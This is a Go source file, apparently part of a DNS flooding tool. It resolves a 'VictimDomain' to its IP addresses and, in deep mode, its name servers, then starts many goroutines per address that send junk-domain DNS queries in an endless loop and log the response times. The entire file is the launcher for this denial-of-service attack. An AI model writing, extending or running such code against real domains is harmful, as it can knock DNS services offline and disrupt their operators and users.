package internal

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

type Launcher struct {
	// Public variables are always not nil
	NRoutines    *int
	NQuestions   *int
	VictimDomain *string
	SleepTime    *time.Duration
	Deep         *bool

	ipAddresses []net.IP
	nameServers []*net.NS // only for deep mode
	stop        chan struct{}
	wg          sync.WaitGroup
}

func (l *Launcher) Initialize() {
	l.ipAddresses = make([]net.IP, 0)
	l.stop = make(chan struct{})
	var err error
	l.ipAddresses, err = net.LookupIP(*l.VictimDomain)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not get IPs: %v\n", err)
		os.Exit(1)
	}
	if *l.Deep {
		l.nameServers, err = net.LookupNS(*l.VictimDomain)
		if err != nil {
			fmt.Fprintf(os.Stderr, "could not get name servers: %v\n", err)
			os.Exit(1)
		}
	}
}

func (l *Launcher) Start() {
	for _, ipAddress := range l.ipAddresses {
		for i := 0; i < *l.NRoutines; i++ {
			l.wg.Add(1)
			go l.runner(ipAddress.String())
		}
	}
}

func (l *Launcher) runner(ipString string) {
	client := NewDNSClient(fmt.Sprintf("%s:53", ipString), *l.NQuestions, *l.VictimDomain)
	for {
		rtt, dnsErr, err := client.SendJunkDomainsRequest()
		errorMessage := "none"
		if err != nil {
			errorMessage = err.Error()
		}
		if dnsErr == "" {
			dnsErr = "none"
		}
		log.Printf("RTT: %-12s  DNS_ERR: %-8s  NET_ERR: %s", rtt.String(), dnsErr, errorMessage)
		if l.SleepTime != nil {
			time.Sleep(*l.SleepTime)
		}
		select {
		case _, ok := <-l.stop:
			if !ok {
				l.wg.Done()
				return
			}
		default:
		}
	}
}

func (l *Launcher) AwaitShutdown() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(
		sigChan,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGTERM,
		syscall.SIGQUIT,
	)
	<-sigChan
}

func (l *Launcher) Stop() {
	close(l.stop)
	l.wg.Wait()
}
